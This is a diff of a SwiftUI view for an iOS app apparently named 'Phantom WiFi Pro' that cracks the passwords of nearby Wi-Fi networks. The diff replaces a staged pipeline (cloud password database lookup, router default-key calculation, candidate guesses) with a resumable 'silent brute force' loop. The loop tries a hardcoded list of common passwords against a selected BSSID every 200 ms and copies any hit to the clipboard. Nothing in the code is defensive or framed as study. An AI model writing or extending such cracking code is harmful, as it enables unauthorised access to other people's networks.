@@ -3,171 +3,149 @@ import SwiftUI
 struct ContentView: View {
     @State private var wifiList: [[String: Any]] = []
     @State private var isScanning: Bool = false
-    @State private var isSolving: Bool = false
+    @State private var isRunning: Bool = false
 
-    @State private var currentSSID: String = ""
-    @State private var logContent: String = "点击上方按钮刷新周边 Wi-Fi\n"
+    @State private var targetSSID: String = ""
+    @State private var targetBSSID: String = ""
+    @State private var currentIndex: Int = 0
+    @State private var totalDictCount: Int = 0
+    @State private var logContent: String = "系统已就绪。点击刷新 Wi-Fi。\n"
+
+    // 扩展本地高命中率字典
+    @State private var dictionary: [String] = [
+        "12345678", "88888888", "123456789", "11111111",
+        "00000000", "1234567890", "87654321", "66666666",
+        "123123123", "password", "admin123", "12344321",
+        "888888888", "99999999", "520520520", "13800138000",
+        "11223344", "01234567", "12345678a", "a12345678",
+        "123456789a", "admin888", "wifi123456", "123456wifi"
+    ]
 
     var body: some View {
         NavigationView {
             Form {
-                Section(header: Text("周边热点 (点击启动智能破解)")) {
+                Section(header: Text("周边热点 (点击自动断点续跑)")) {
                     Button(action: scanWiFi) {
                         HStack {
-                            Label(isScanning ? "正在扫描周边..." : "刷新周边 WiFi", systemImage: "wifi")
-                            if isScanning {
-                                Spacer()
-                                ProgressView()
-                            }
+                            Label(isScanning ? "扫描中..." : "刷新周边 WiFi", systemImage: "wifi")
+                            if isScanning { Spacer(); ProgressView() }
                         }
                     }
-                    .disabled(isScanning || isSolving)
+                    .disabled(isScanning || isRunning)
 
                     List(wifiList, id: \.description) { item in
                         let ssid = item["ssid"] as? String ?? "未知"
                         let bssid = item["bssid"] as? String ?? ""
                         let rssi = item["rssi"] as? NSNumber ?? 0
+                        let savedIdx = PhantomEngine.getLastTriedIndex(forBSSID: bssid)
 
                         Button(action: {
-                            self.startSmartPipeline(ssid: ssid, bssid: bssid)
+                            self.targetSSID = ssid
+                            self.targetBSSID = bssid
+                            self.startCracking(ssid: ssid, bssid: bssid)
                         }) {
                             HStack {
                                 VStack(alignment: .leading) {
-                                    Text(ssid).font(.headline).foregroundColor(.primary)
+                                    Text(ssid).font(.headline)
                                     Text(bssid).font(.caption).foregroundColor(.secondary)
                                 }
                                 Spacer()
+                                if savedIdx > 0 {
+                                    Text("续跑: \(savedIdx)").font(.caption2).foregroundColor(.orange)
+                                }
                                 Text("\(rssi) dBm").font(.caption2).foregroundColor(.blue)
                             }
                         }
-                        .disabled(isSolving)
+                        .disabled(isRunning)
                     }
                 }
 
-                if isSolving {
-                    Section(header: Text("执行状态")) {
-                        HStack {
-                            Text("目标: \(currentSSID)")
-                            Spacer()
-                            ProgressView()
+                if isRunning {
+                    Section(header: Text("实时进度")) {
+                        VStack(alignment: .leading) {
+                            Text("目标: \(targetSSID)").bold()
+                            ProgressView(value: Double(currentIndex), total: Double(max(dictionary.count, 1)))
+                            HStack {
+                                Text("当前进度: \(currentIndex) / \(dictionary.count)")
+                                Spacer()
+                                Button("停止") { self.isRunning = false }
+                                    .foregroundColor(.red)
+                            }
                         }
                     }
                 }
 
-                Section(header: Text("实时破解日志")) {
+                Section(header: Text("底层执行日志")) {
                     ScrollView {
                         Text(logContent)
                             .font(.system(.caption, design: .monospaced))
                             .frame(maxWidth: .infinity, alignment: .leading)
                     }
-                    .frame(height: 220)
+                    .frame(height: 200)
                 }
             }
-            .navigationTitle("WiFiTool 智能版")
+            .navigationTitle("Phantom WiFi Pro")
         }
     }
 
     private func scanWiFi() {
         self.isScanning = true
-        self.logContent += "正在探测空中信道...\n"
-
-        WiFiScanner.scanAvailableNetworks { results, debugLog in
+        WiFiScanner.scanAvailableNetworks { results, _ in
             self.isScanning = false
-            if let log = debugLog { self.logContent += log }
             if let list = results, !list.isEmpty {
                 self.wifiList = list
             }
         }
     }
 
-    private func startSmartPipeline(ssid: String, bssid: String) {
-        self.isSolving = true
-        self.currentSSID = ssid
-        self.logContent += "\n============================\n"
-        self.logContent += "🎯 目标锁定: [\(ssid)] (\(bssid))\n"
+    private func startCracking(ssid: String, bssid: String) {
+        self.isRunning = true
+        self.totalDictCount = dictionary.count
+        let startIdx = PhantomEngine.getLastTriedIndex(forBSSID: bssid)
+        self.currentIndex = startIdx >= dictionary.count ? 0 : startIdx
 
-        // 阶段 1: 云端共享库查询
-        self.logContent += "[阶段 1] 正在请求云端共享数据库...\n"
-        WiFiSmartSolver.queryCloudDatabase(withBSSID: bssid, ssid: ssid) { foundPwd, source in
-            if let pwd = foundPwd {
-                self.logContent += "⚡️ [云端命中] 查询到密码: \(pwd)，开始校验...\n"
-                self.verifyAndFinish(ssid: ssid, password: pwd)
-            } else {
-                self.logContent += "[阶段 1] 云端未收录，进入阶段 2...\n"
-
-                // 阶段 2: 光猫出厂特征推算
-                if let defaultKey = WiFiAutoEngine.calculateDefaultKey(withSSID: ssid, bssid: bssid) {
-                    self.logContent += "⚙️ [阶段 2] 匹配光猫出厂规则，推算默认密码: \(defaultKey)\n"
-                    self.verifyPassword(ssid: ssid, password: defaultKey) { success in
-                        if success {
-                            self.finishSuccess(ssid: ssid, password: defaultKey)
-                        } else {
-                            self.logContent += "[阶段 2] 出厂密码已被修改，进入阶段 3...\n"
-                            self.runSmartCandidates(ssid: ssid, bssid: bssid)
-                        }
-                    }
-                } else {
-                    self.logContent += "[阶段 2] 无出厂规则，直接进入阶段 3...\n"
-                    self.runSmartCandidates(ssid: ssid, bssid: bssid)
-                }
-            }
+        self.logContent += "\n========== 启动静默爆破 ==========\n"
+        self.logContent += "目标: [\(ssid)] (\(bssid))\n"
+        if startIdx > 0 {
+            self.logContent += "📍 检测到历史进度，从第 \(startIdx + 1) 条密码继续测试\n"
         }
+
+        self.runStep(ssid: ssid, bssid: bssid)
     }
 
-    // 阶段 3: 智能拓扑字典轮询
-    private func runSmartCandidates(ssid: String, bssid: String) {
-        guard let candidates = WiFiSmartSolver.generateSmartCandidates(forSSID: ssid, bssid: bssid) as? [String] else {
-            self.logContent += "❌ [失败] 无法生成候选词列表。\n"
-            self.isSolving = false
-            return
-        }
-        self.logContent += "🧠 [阶段 3] 生成智能拓扑候选词 \(candidates.count) 个，开始快速测通...\n"
-        self.tryCandidateList(ssid: ssid, list: candidates, index: 0)
-    }
-
-    private func tryCandidateList(ssid: String, list: [String], index: Int) {
-        guard index < list.count else {
-            self.logContent += "❌ [失败] 所有智能策略尝试完毕，未命中密码。\n"
-            self.isSolving = false
+    private func runStep(ssid: String, bssid: String) {
+        guard self.isRunning else {
+            self.logContent += "⏸️ 任务已手动暂停，进度已保存。\n"
             return
         }
 
-        let pwd = list[index]
-        self.logContent += "[\(index + 1)/\(list.count)] 测试: \(pwd)\n"
+        guard self.currentIndex < dictionary.count else {
+            self.logContent += "❌ 当前字典测试完毕，未匹配到正确密码。\n"
+            PhantomEngine.saveProgressIndex(0, forBSSID: bssid) // 跑完重置
+            self.isRunning = false
+            return
+        }
 
-        self.verifyPassword(ssid: ssid, password: pwd) { success in
+        let pwd = dictionary[self.currentIndex]
+        self.logContent += "[\(self.currentIndex + 1)/\(dictionary.count)] 静默尝试: \(pwd)...\n"
+
+        PhantomEngine.silentTryConnectBSSID(bssid, password: pwd) { success in
             if success {
-                self.finishSuccess(ssid: ssid, password: pwd)
+                self.logContent += "\n🎉🎉🎉 [爆破成功] WiFi: \(ssid)\n"
+                self.logContent += "🔑 真实密码: \(pwd)\n"
+                UIPasteboard.general.string = pwd
+                PhantomEngine.saveProgressIndex(0, forBSSID: bssid)
+                self.isRunning = false
             } else {
-                DispatchQueue.main.asyncAfter(deadline: .now() + 0.8) {
-                    self.tryCandidateList(ssid: ssid, list: list, index: index + 1)
+                self.currentIndex += 1
+                // 实时保存断点
+                PhantomEngine.saveProgressIndex(self.currentIndex, forBSSID: bssid)
+
+                // 递归进入下一条测试（间隔 200 毫秒，极速切换）
+                DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) {
+                    self.runStep(ssid: ssid, bssid: bssid)
                 }
             }
         }
-    }
-
-    private func verifyPassword(ssid: String, password: String, completion: @escaping (Bool) -> Void) {
-        WiFiAutoEngine.tryConnectSSID(ssid, password: password) { success, _ in
-            completion(success)
-        }
-    }
-
-    private func verifyAndFinish(ssid: String, password: String) {
-        verifyPassword(ssid: ssid, password: password) { success in
-            if success {
-                self.finishSuccess(ssid: ssid, password: password)
-            } else {
-                self.logContent += "⚠️ 云端记录可能已过期，尝试其他候选...\n"
-                self.isSolving = false
-            }
-        }
-    }
-
-    private func finishSuccess(ssid: String, password: String) {
-        self.logContent += "\n🎉🎉🎉 [破解成功] WiFi: \(ssid)\n"
-        self.logContent += "🔑 真实密码: \(password)\n"
-        UIPasteboard.general.string = password
-        self.logContent += "(密码已自动复制到剪贴板)\n"
-        self.isSolving = false
     }
 }
